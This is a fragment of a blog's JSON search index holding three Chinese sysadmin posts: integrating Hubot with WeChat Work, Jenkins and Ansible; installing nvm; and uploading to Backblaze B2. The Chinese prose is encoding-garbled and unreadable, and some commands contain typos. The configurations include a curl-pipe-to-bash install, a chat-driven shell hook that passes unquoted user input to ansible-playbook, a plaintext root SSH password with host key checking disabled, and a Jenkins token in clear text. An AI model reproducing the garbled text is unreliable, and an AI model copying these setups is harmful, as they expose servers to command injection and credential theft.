Environment=\u0026#34;NODE_VERSION=default\u0026#34; Environment=\u0026#34;WECHATWORK_CORP_ID=aaaa\u0026#34; Environment=\u0026#34;WECHATWORK_APP_AGENT_ID=bbbb\u0026#34; Environment=\u0026#34;WECHATWORK_APP_SECRET=cccc\u0026#34; Environment=\u0026#34;WECHATWORK_AES_KEY=dddd\u0026#34; ExecStart=/home/bot/.nvm/nvm-exec /home/bot/myhubot/bin/hubot --adapter wechatwork [Install] WantedBy=multi-user.target æ³¨æ„ä¸Šé¢ï¼Œæˆ‘ä»¬æŒ‡å®šäº†ç¯å¢ƒå˜é‡ NODE_VERSION=defaultï¼Œä»¥åŠæœ€ä¸‹çš„ ExecStartï¼Œç¡®å®šç”¨ nvm-exec å¼•åŠ¨ node\nå¦å¤–æŠŠ wechatwork æ‰€éœ€çš„4ä¸ªå‚æ•°ä¹Ÿæ”¾è¿›ç¯å¢ƒå˜é‡ä¸­ï¼Œè¿™æ ·é‡å¯å°±å¯ä»¥äº†\nsystemctl daemon-reload systemctl start hubot äº”ã€é›†æˆjenkins å‡†å¤‡çŸ¥è¯†ï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ jenkins æ‹¿åˆ°ç”¨æˆ·åå’Œ tokenï¼ˆtokenæ˜¯ç”¨æ¥ä»£æ›¿å¯†ç çš„ï¼‰ï¼Œç”¨æ¥è®¿é—® jenkins\né¦–å…ˆç™»å½• jenkinsï¼Œè®¿é—®ç½‘å€ï¼š$JENKINS_URL/me/configureï¼Œæ–°å»ºä¸€ä¸ª API Tokenï¼Œè®°å½•ä¸‹æ¥\nç”¨æ³•å¾ˆç®€å•ï¼štokenæ›¿ä»£å¯†ç ç”¨äº url è®¤è¯å³å¯ã€‚\ncd /home/bot/myhubot npm install hubot-jenkins-optimised #ç¼–è¾‘external-scripts.json vi external-scripts.json [ \u0026#34;hubot-diagnostics\u0026#34;, \u0026#34;hubot-help\u0026#34;, \u0026#34;hubot-google-images\u0026#34;, \u0026#34;hubot-google-translate\u0026#34;, \u0026#34;hubot-pugme\u0026#34;, \u0026#34;hubot-maps\u0026#34;, \u0026#34;hubot-rules\u0026#34;, \u0026#34;hubot-shipit\u0026#34;, \u0026#34;hubot-jenkins-optimised\u0026#34; ] #ä¸Šé¢å¢åŠ äº†ä¸€è¡Œ hubot-jenkins-optimised #ç¼–è¾‘ /etc/systemd/system/hubot.service ï¼Œæ·»åŠ  jenkins çš„ç¯å¢ƒå˜é‡ #jenkinsçš„ç”¨æˆ·åæ˜¯peï¼Œæ‰€æœ‰authæ˜¯ \u0026#34;pe:x837491lkaflajksdf7\u0026#34; ...... Environment=\u0026#34;HUBOT_JENKINS_AUTH=pe:x837491lkaflajksdf7\u0026#34; Environment=\u0026#34;HUBOT_JENKINS_URL=http://192.168.1.90:8080/\u0026#34; ...... # é‡å¯ hubot systemctl daemon-reload systemctl restart hubot ç„¶åæˆ‘ä»¬ç§èŠè¿™ä¸ªæœºå™¨äººï¼Œå¯¹å®ƒè¯´: jenkins listï¼Œå°±å¯ä»¥çœ‹åˆ°é¡¹ç›®äº†ï¼Œ jenkins b 3 å°±å¯ä»¥å¼€å§‹buildç¬¬ä¸‰ä¸ªé¡¹ç›®äº†ï¼Œæ‰€æœ‰å‘½ä»¤å¯ä»¥é€šè¿‡å¯¹æœºå™¨äººè¯´ help æ¥è·å¾—\nå…­ã€é›†æˆansible é›†æˆ ansibleï¼Œå…¶å®å°±æ˜¯é›†æˆä¸€ä¸ª shellï¼Œä¹Ÿå¾ˆç®€å•\ncd /home/bot/myhubot npm install hubot-script-shellcmd #ç¼–è¾‘external-scripts.json vi external-scripts.json [ \u0026#34;hubot-diagnostics\u0026#34;, \u0026#34;hubot-help\u0026#34;, \u0026#34;hubot-google-images\u0026#34;, \u0026#34;hubot-google-translate\u0026#34;, \u0026#34;hubot-pugme\u0026#34;, \u0026#34;hubot-maps\u0026#34;, \u0026#34;hubot-rules\u0026#34;, \u0026#34;hubot-shipit\u0026#34;, \u0026#34;hubot-jenkins-optimised\u0026#34;, \u0026#34;hubot-script-shellcmd\u0026#34; ] #ä¸Šé¢å¢åŠ äº†ä¸€è¡Œ hubot-script-shellcmd #æŠŠshellcmdç›®å½•ä¸‹çš„bashç›®å½•ï¼Œå¤åˆ¶ä¸€ä»½åˆ°/home/bot/myhubot/bash cp -R node_modules/hubot-script-shellcmd/bash ./ #æˆ‘ä»¬æŠŠansibleçš„ymléƒ½æ”¾åˆ°/homebot/myhubot/bash/ansibleç›®å½•ä¸‹ cd /home/bot/myhubot/bash mkdir ansible #æŠŠansible-playbookçš„ymléƒ½æ”¾è¿›å» .... #ç„¶åç¼–å†™å‘½ä»¤è„šæœ¬ cd /home/bot/myhubot/bash/handles cat \u0026lt; EOF \u0026gt;\u0026gt; fuse #!/bin/bash if [ -n \u0026#34;$1\u0026#34; ] ; then if [ -n \u0026#34;$2\u0026#34; ] ; then ansible-playbook /home/bot/myhubot/bash/ansible/check-disk.yml -e \u0026#34;ip=$1 fs=$2\u0026#34; else ansible-playbook /home/bot/myhubot/bash/ansible/check-disk.yml -e \u0026#34;ip=$1 fs=/\u0026#34; fi fi exit 0 EOF #ç»™æ‰§è¡Œæƒ chmod 755 /home/bot/myhubot/bash/handles/fuse #é‡å¯hubot systemctl restart hubot check-disk.yml çš„çœŸèº«ï¼Œæ˜¯åœ¨è¿œç¨‹æœºå™¨ä¸Šè°ƒç”¨æœ¬æœºæ‰æœ‰çš„rust dustå‘½ä»¤ï¼Œæ¥ç®—å‡ºè¿œç¨‹æœºå™¨çš„æŸä¸ªç›®å½•çš„ä½¿ç”¨æƒ…å†µ\n--- - name: check machine disk space hosts: \u0026#34;{{ ip }}\u0026#34; gather_facts: false vars: - ip: \u0026#34;{{ ip }}\u0026#34; - fs: \u0026#34;{{ fs }}\u0026#34; - ansible_ssh_user: \u0026#34;root\u0026#34; - ansible_ssh_pass: \u0026#34;Fuck2021!\u0026#34; - ansible_ssh_common_args: \u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; - host_key_checking: False tasks: - name: Run a script with arguments (using \u0026#39;cmd\u0026#39; parameter) ansible.builtin.script: cmd: /usr/local/bin/dust -bcr {{ fs }} register: output - debug: var=output.stdout_lines æˆ‘ä»¬åœ¨ä¼ä¸šå¾®ä¿¡å¯¹æœºå™¨è¯´ shell ï¼Œå°±ä¼šå¾—åˆ°æ‰€æœ‰å‘½ä»¤åˆ—è¡¨\nå¯¹å®ƒè¯´ shell fuse 172.19.16.1 /export ï¼Œå°±ä¼šæŠŠæœ¬æœºæ‰æœ‰çš„ dust å‘½ä»¤ï¼Œæ‹·è´åˆ°172.19.16.1çš„æœºå™¨ä¸Šï¼Œå¹¶å¯¹ /export æ‰§è¡Œï¼Œå¾—åˆ°å ç£ç›˜ç©ºé—´æœ€å¤§çš„æ–‡ä»¶å’Œç›®å½•ã€‚\nå‚è€ƒèµ„æ–™ï¼š https://qydev.weixin.qq.com/wiki/index.php?title=%E5%8F%91%E9%80%81%E6%8E%A5%E5%8F%A3%E8%AF%B4%E6%98%8E\nhttp://sd.blackball.lv/library/Automation_and_Monitoring_with_Hubot_(2014).pdf\n","permalink":"https://rendoumi.com/posts/20211222-hubot_wechat/","summary":"\u003cp\u003eHubotæ˜¯ä¸€ä¸ªé€šç”¨çš„èŠå¤©æœºå™¨äººï¼Œèƒ½å’Œå¾ˆå¤šèŠå¤©è½¯ä»¶é›†æˆï¼Œæ¯”å¦‚slackã€rockchatã€telegramã€ä¼ä¸šå¾®ä¿¡ã€IRCç­‰ã€‚\u003c/p\u003e\n\u003cp\u003eå…¬å¸ç”¨çš„æ˜¯ä¼ä¸šå¾®ä¿¡ï¼Œä¹‹å‰ç”¨ç¾¤æœºå™¨äººå’Œ prometheus é›†æˆï¼Œå‘é€å„ç§å‘Šè­¦ä¿¡æ¯ï¼Œä½†æ˜¯ç¾¤æœºå™¨äººæ— æ³•æ¥æ”¶æ¶ˆæ¯ï¼›åŒæ—¶æˆ‘ä»¬æƒ³é›†æˆè¿›å»å¾ˆå¤šè‡ªå®šä¹‰å‘½ä»¤ï¼Œæ¯”å¦‚å‘é€æŒ‡ä»¤å°±å¼€å§‹ jenkins buildï¼Œå‘é€ ansible æŒ‡ä»¤æ‰§è¡Œï¼Œå‘é€æµé‡å›¾å°±è‡ªåŠ¨æŠŠæœºæˆ¿çš„æµé‡å›¾å‘è¿‡æ¥ï¼Œè¿™ä¸ªç¾¤æœºå™¨äººå°±ç”¨ä¸æˆäº†ã€‚æ‰€ä»¥å¿…é¡»å†ç›´æ¥ä¸€äº›ï¼Œæ„å»ºä¸€ä¸ªä¼ä¸šå¾®ä¿¡çš„åº”ç”¨ã€‚\u003c/p\u003e\n\u003ch2 id=\"ä¸€ä¼ä¸šå¾®ä¿¡å®‰è£…å‰å‡†å¤‡\"\u003eä¸€ã€ä¼ä¸šå¾®ä¿¡å®‰è£…å‰å‡†å¤‡\u003c/h2\u003e\n\u003cp\u003eå®‰è£…å‰éœ€è¦åœ¨ä¼ä¸šå¾®ä¿¡ä¸­æ‹¿åˆ°4ä¸ªä¿¡æ¯ï¼š\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eWECHATWORK_CORP_ID\u003c/li\u003e\n\u003cli\u003eWECHATWORK_APP_AGENT_ID\u003c/li\u003e\n\u003cli\u003eWECHATWORK_APP_SECRET\u003c/li\u003e\n\u003cli\u003eWECHATWORK_AES_KEY\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eé¦–å…ˆè”ç³»ä¼ä¸šå¾®ä¿¡ç®¡ç†å‘˜æ–°å¢ä¸€ä¸ªåº”ç”¨ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222144935256\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222144935256.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåœ¨â€œç®¡ç†åå°-æˆ‘çš„ä¼ä¸šâ€ä¸­å¯ä»¥è·å¾—åœ°ä¸€ä¸ªä¿¡æ¯ï¼Œä¼ä¸š ID ä¿¡æ¯ï¼ŒCORP_ID  ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222144654696\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222144654696.png\"\u003eæ‹¿æ‹¿  åœ¨â€œç®¡ç†åå°-åº”ç”¨ç®¡ç†-ç‚¹å‡»æŸå…·ä½“åº”ç”¨-è¯¦æƒ…â€é¡µä¸­å¯ä»¥è·å¾—äºŒã€ä¸‰ä¸ªä¿¡æ¯ï¼Œ APP_AGENT_ID å’Œ APP_SECRET\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222150424143\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222150424143.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç¬¬å››ä¸ª AES_KEY å°±æ¯”è¾ƒéº»çƒ¦äº†ï¼Œæˆ‘ä»¬è¿›å…¥è¿™ä¸ªåº”ç”¨ï¼Œç‚¹å‡»é…ç½®çš„å›¾æ ‡ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222151155307\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222151155307.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åè¿›å…¥ï¼Œç‚¹å‡»å¯ç”¨ API æ¥æ”¶\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222151325525\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222151325525.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åè®¾ç½®ä¸€ä¸‹\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eurl å¡«å†™ \u003ca href=\"https://hubot.rendoumi.com/wechatwork/webhook\"\u003ehttps://hubot.rendoumi.com/wechatwork/webhook\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003eToken ç‚¹éšæœºè·å–\u003c/li\u003e\n\u003cli\u003eEncodingAESKey ç‚¹éšæœºè·å–ï¼Œè¿™å°±æ˜¯å…·ä½“çš„ AESKey äº†\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211222151552345\" loading=\"lazy\" src=\"/posts/20211222-hubot_wechat/image-20211222151552345.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶åç‚¹å‡»ä¿å­˜ï¼Œè¿™é‡Œå¿…ç„¶ä¼šå¤±è´¥ï¼æ²¡æœ‰å…³ç³»ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æ²¡æœ‰è£…hubotå‘¢ã€‚æˆ‘ä»¬æŠŠè¿™ä¸‰ä¸ªåœ°æ–¹å…ˆè®°å½•ä¸‹æ¥ï¼Œéšåå†æ¥ç‚¹å‡»ä¿å­˜ã€‚\u003c/p\u003e\n\u003ch2 id=\"äºŒhubot-å®‰è£…å‰å‡†å¤‡\"\u003eäºŒã€Hubot å®‰è£…å‰å‡†å¤‡\u003c/h2\u003e\n\u003cp\u003e1ã€æ³¨æ„ä¸Šé¢åœ°å€ï¼šURL åœ°å€æ˜¯ https ï¼Œç„¶å hubot çš„ç¼ºçœåœ°å€æ˜¯ http://xxx:8080 ï¼Œè¿™æ ·å¦‚æœå‰é¢æ²¡æœ‰è¯ä¹¦å¸è½½çš„è®¾å¤‡ï¼Œå°±å¾—æ­å»ºä¸€ä¸ªNginxï¼ˆhaproxyã€traefikï¼‰æ¥ä»£ç† https 443ç«¯å£åˆ°8080ã€‚\u003c/p\u003e\n\u003cp\u003e2ã€Hubot æ˜¯æ”¯æŒ Coffeescript å’Œ nodejs çš„ï¼Œä»å®ƒçš„ Adapters ç½‘é¡µçœ‹\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://hubot.github.com/docs/adapters/development/\"\u003ehttps://hubot.github.com/docs/adapters/development/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eé‡Œé¢éƒ½æ˜¯ coffee å‘³çš„å•ç®­å¤´å‡½æ•°ï¼Œå¯¼è‡´ä¸å¤ªç†Ÿæ‚‰çš„å…«æˆ’ä»¥ä¸ºåœ¨ wechatwork moduleå¯¼å‡ºçš„æ—¶å€™ä¹Ÿåº”è¯¥ç”¨å•ç®­å¤´å‡½æ•°ï¼Œç»“æœå°±æ‚²å‰§äº†ã€‚\u003c/p\u003e","title":"huboté›†æˆä¼ä¸šå¾®ä¿¡+jenkins+ansible"},{"content":"æœ€è¿‘åœ¨æ JavaScriptsï¼Œnodejsçš„ç‰ˆæœ¬æ»¡å¤©é£ï¼Œä¹‹å‰ç”¨çš„ nvm ç®¡ç†çš„æ–¹æ³•çªç„¶ä¸èƒ½ç”¨äº†ã€‚\nè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œæ¯”è¾ƒæ–°çš„ nvm çš„å®‰è£…ä½¿ç”¨æ–¹æ³•ï¼š\nä¸‹è½½å®‰è£…ï¼š\ncurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash ä»¥ä¸Šçš„è„šæœ¬å®‰è£…åˆ°åº•åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ\nä¸€ã€å®ƒ clone äº† nvm åˆ° $HOME/.nvmç›®å½•\näºŒã€å®ƒåœ¨ .bashrc ä¸­æ·»åŠ äº†ä¸‰è¡Œ\näº‹å®ä¸Šå®ƒæ˜¯æ ¹æ®å½“å‰çš„ bash é€‰æ‹©åœ¨ .bash_profileã€.zshrcã€.profileã€.bashrcä¸­çš„æŸä¸€ä¸ªè¿›è¡Œæ·»åŠ \nç„¶åæˆ‘ä»¬é€€å‡ºç»ˆç«¯ï¼Œå¹¶é‡æ–°è¿›å…¥ï¼Œçœ‹çœ‹\nnvm list nvm ls-remote ç„¶åé€‰æ‹©æœ€æ–°çš„ç‰ˆæœ¬å®‰è£…ï¼š\nnvm install v16.13.1 å¦‚æœæƒ³ä½¿ç”¨ä¸åŒç‰ˆæœ¬\nnvm use 14.0.0 è®¾ç½®ç¼ºçœç‰ˆæœ¬æˆ–è€…å–æ¶ˆ\nnvm alias defaut \u0026lt;your_nodejs_default_version\u0026gt; nvm alias default 14.0.0 node -v # prints 14.0.0 å‚è€ƒåœ°å€ï¼šhttps://github.com/nvm-sh/nvm\n","permalink":"https://rendoumi.com/posts/20211217-nodejs_nvm/","summary":"\u003cp\u003eæœ€è¿‘åœ¨æ JavaScriptsï¼Œnodejsçš„ç‰ˆæœ¬æ»¡å¤©é£ï¼Œä¹‹å‰ç”¨çš„ nvm ç®¡ç†çš„æ–¹æ³•çªç„¶ä¸èƒ½ç”¨äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œæ¯”è¾ƒæ–°çš„ nvm çš„å®‰è£…ä½¿ç”¨æ–¹æ³•ï¼š\u003c/p\u003e\n\u003cp\u003eä¸‹è½½å®‰è£…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh \u003cspan class=\"p\"\u003e|\u003c/span\u003e bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä»¥ä¸Šçš„è„šæœ¬å®‰è£…åˆ°åº•åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eä¸€ã€å®ƒ clone äº† nvm åˆ° $HOME/.nvmç›®å½•\u003c/p\u003e\n\u003cp\u003eäºŒã€å®ƒåœ¨ .bashrc ä¸­æ·»åŠ äº†ä¸‰è¡Œ\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211217093956358\" loading=\"lazy\" src=\"/posts/20211217-nodejs_nvm/image-20211217093956358.png\"\u003e\u003c/p\u003e\n\u003cp\u003eäº‹å®ä¸Šå®ƒæ˜¯æ ¹æ®å½“å‰çš„ bash é€‰æ‹©åœ¨ .bash_profileã€.zshrcã€.profileã€.bashrcä¸­çš„æŸä¸€ä¸ªè¿›è¡Œæ·»åŠ \u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬é€€å‡ºç»ˆç«¯ï¼Œå¹¶é‡æ–°è¿›å…¥ï¼Œçœ‹çœ‹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm list\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm ls-remote\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åé€‰æ‹©æœ€æ–°çš„ç‰ˆæœ¬å®‰è£…ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm install v16.13.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœæƒ³ä½¿ç”¨ä¸åŒç‰ˆæœ¬\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm use 14.0.0\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè®¾ç½®ç¼ºçœç‰ˆæœ¬æˆ–è€…å–æ¶ˆ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm \u003cspan class=\"nb\"\u003ealias\u003c/span\u003e defaut \u0026lt;your_nodejs_default_version\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003envm \u003cspan class=\"nb\"\u003ealias\u003c/span\u003e default 14.0.0\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enode -v \u003cspan class=\"c1\"\u003e# prints 14.0.0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‚è€ƒåœ°å€ï¼šhttps://github.com/nvm-sh/nvm\u003c/p\u003e","title":"nodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç†"},{"content":"S3 çš„æ¡¶å­˜å‚¨å¯ä»¥ç”¨ minio æ¥æ¨¡æ‹Ÿã€‚\nç½‘ä¸Šæœ‰ä¸ª Backblaze çš„ç½‘ç«™ï¼Œæä¾› 10GB çš„å…è´¹ç©ºé—´ï¼Œä¸”å¦‚æœæ˜¯å…¬ç½‘è®¿é—®ï¼Œ1GBæµé‡æ˜¯å…è´¹çš„ï¼Œå¦‚æœå‰é¢å¥—äº† Cloudflare çš„CDNï¼Œé‚£åŸºæœ¬æ˜¯å…¨å…äº†ã€‚\nè¯´ä¸‹ä½¿ç”¨æ–¹å¼ï¼š\né¦–å…ˆå» https://www.backblaze.com/ æ³¨å†Œä¸ªå¸å·ï¼š\nç„¶åç›´æ¥å»ºä¸ªæ¡¶ï¼ˆCreate a Bucketï¼‰\næ¡¶æ–‡ä»¶ç±»å‹é€‰æ‹© publicï¼Œå¦åˆ™æ— æ³•å…¬ç½‘è®¿é—®ï¼š\nç„¶å gen å‡º master app key æ¥å¹¶è®°å½•å¥½ï¼š\néšåæœ€å¤§çš„é—®é¢˜å°±æ¥äº†ï¼Œå¦‚æœä½ ç”¨å®ƒé¡µé¢è‡ªå¸¦çš„ä¸Šä¼ ä¸‹è½½å·¥å…·ï¼Œå½»åº•å®Œè›‹ï¼Œæ‹–è¿›å»çš„æ–‡ä»¶å¤¹ä¼šå˜æˆæ‰å¹³çš„ï¼Œå®Œå…¨ä¸§å¤±ç›®å½•ç»“æ„ã€‚\nå¿…é¡»è¦æ‰¾ä¸€ä¸ªå¥½ç”¨çš„ä¸Šä¼ å·¥å…·äº†ï¼Œæ¨è b2 ã€‚\nb2 å·¥å…·ä¸‹è½½ï¼š\nhttps://github.com/Backblaze/B2_Command_Line_Tool\nä¸‹è½½åç›´æ¥æ”¹åä¸º b2 ï¼Œç„¶åæ”¾åˆ° /usr/local/bin ä¸­\nwget -O /usr/local/bin/b2 https://github.com/Backblaze/B2_Command_Line_Tool/releases/download/v3.1.0/b2-linux chmod 755 /usr/lcoal/b2 è¿è¡Œä¸€ä¸‹ï¼Œæœ‰å¾ˆå¤šå‘½ä»¤å‚æ•°ï¼š\nè¯¦ç»†çš„ä½¿ç”¨æ–‡æ¡£ï¼š\nhttps://b2-command-line-tool.readthedocs.io/en/master/\nå…ˆå»é…ç½®å¸å·ï¼Œè¾“å…¥applicationKeyIdå’ŒapplicationKey\nb2 authorize-account ç„¶åå°±å¯ä»¥å¾€æ¡¶é‡Œä¼ ä¸œè¥¿äº†ï¼ŒæŠŠå½“å‰ç›®å½•ä¸‹çš„ä¸œè¥¿ä¼ åˆ° rendoumi è¿™ä¸ªæ¡¶é‡Œï¼Œå¹¶ä¸”ä¸è¦ä¼  .git ç›®å½•\nb2 sync --excludeDirRegex .git . b2://rendoumi/ å¥— Cloudflare å°±éšæ„äº†ã€‚full sslï¼Œå»ºä¸ª CNAME ä¸”ç”¨ Page rule åš url è½¬å‘å°±å¯ä»¥äº†ã€‚\n","permalink":"https://rendoumi.com/posts/20211208-backblaze_usage/","summary":"\u003cp\u003eS3 çš„æ¡¶å­˜å‚¨å¯ä»¥ç”¨ minio æ¥æ¨¡æ‹Ÿã€‚\u003c/p\u003e\n\u003cp\u003eç½‘ä¸Šæœ‰ä¸ª Backblaze çš„ç½‘ç«™ï¼Œæä¾› 10GB çš„å…è´¹ç©ºé—´ï¼Œä¸”å¦‚æœæ˜¯å…¬ç½‘è®¿é—®ï¼Œ1GBæµé‡æ˜¯å…è´¹çš„ï¼Œå¦‚æœå‰é¢å¥—äº† Cloudflare çš„CDNï¼Œé‚£åŸºæœ¬æ˜¯å…¨å…äº†ã€‚\u003c/p\u003e\n\u003cp\u003eè¯´ä¸‹ä½¿ç”¨æ–¹å¼ï¼š\u003c/p\u003e\n\u003cp\u003eé¦–å…ˆå» \u003ca href=\"https://www.backblaze.com/\"\u003ehttps://www.backblaze.com/\u003c/a\u003e æ³¨å†Œä¸ªå¸å·ï¼š\u003c/p\u003e\n\u003cp\u003eç„¶åç›´æ¥å»ºä¸ªæ¡¶ï¼ˆCreate a Bucketï¼‰\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211208141419298\" loading=\"lazy\" src=\"/posts/20211208-backblaze_usage/image-20211208141419298.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ¡¶æ–‡ä»¶ç±»å‹é€‰æ‹© publicï¼Œå¦åˆ™æ— æ³•å…¬ç½‘è®¿é—®ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211208141521449\" loading=\"lazy\" src=\"/posts/20211208-backblaze_usage/image-20211208141521449.png\"\u003e\u003c/p\u003e\n\u003cp\u003eç„¶å gen å‡º master app key æ¥å¹¶è®°å½•å¥½ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211208142149530\" loading=\"lazy\" src=\"/posts/20211208-backblaze_usage/image-20211208142149530.png\"\u003e\u003c/p\u003e\n\u003cp\u003eéšåæœ€å¤§çš„é—®é¢˜å°±æ¥äº†ï¼Œå¦‚æœä½ ç”¨å®ƒé¡µé¢è‡ªå¸¦çš„ä¸Šä¼ ä¸‹è½½å·¥å…·ï¼Œå½»åº•å®Œè›‹ï¼Œæ‹–è¿›å»çš„æ–‡ä»¶å¤¹ä¼šå˜æˆæ‰å¹³çš„ï¼Œå®Œå…¨ä¸§å¤±ç›®å½•ç»“æ„ã€‚\u003c/p\u003e\n\u003cp\u003eå¿…é¡»è¦æ‰¾ä¸€ä¸ªå¥½ç”¨çš„ä¸Šä¼ å·¥å…·äº†ï¼Œæ¨è b2 ã€‚\u003c/p\u003e\n\u003cp\u003eb2 å·¥å…·ä¸‹è½½ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/Backblaze/B2_Command_Line_Tool\"\u003ehttps://github.com/Backblaze/B2_Command_Line_Tool\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eä¸‹è½½åç›´æ¥æ”¹åä¸º b2 ï¼Œç„¶åæ”¾åˆ° /usr/local/bin ä¸­\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget -O /usr/local/bin/b2 https://github.com/Backblaze/B2_Command_Line_Tool/releases/download/v3.1.0/b2-linux\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e /usr/lcoal/b2\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eè¿è¡Œä¸€ä¸‹ï¼Œæœ‰å¾ˆå¤šå‘½ä»¤å‚æ•°ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211208142026377\" loading=\"lazy\" src=\"/posts/20211208-backblaze_usage/image-20211208142026377.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè¯¦ç»†çš„ä½¿ç”¨æ–‡æ¡£ï¼š\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://b2-command-line-tool.readthedocs.io/en/master/\"\u003ehttps://b2-command-line-tool.readthedocs.io/en/master/\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eå…ˆå»é…ç½®å¸å·ï¼Œè¾“å…¥applicationKeyIdå’ŒapplicationKey\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eb2 authorize-account\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åå°±å¯ä»¥å¾€æ¡¶é‡Œä¼ ä¸œè¥¿äº†ï¼ŒæŠŠå½“å‰ç›®å½•ä¸‹çš„ä¸œè¥¿ä¼ åˆ° rendoumi è¿™ä¸ªæ¡¶é‡Œï¼Œå¹¶ä¸”ä¸è¦ä¼  .git ç›®å½•\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan 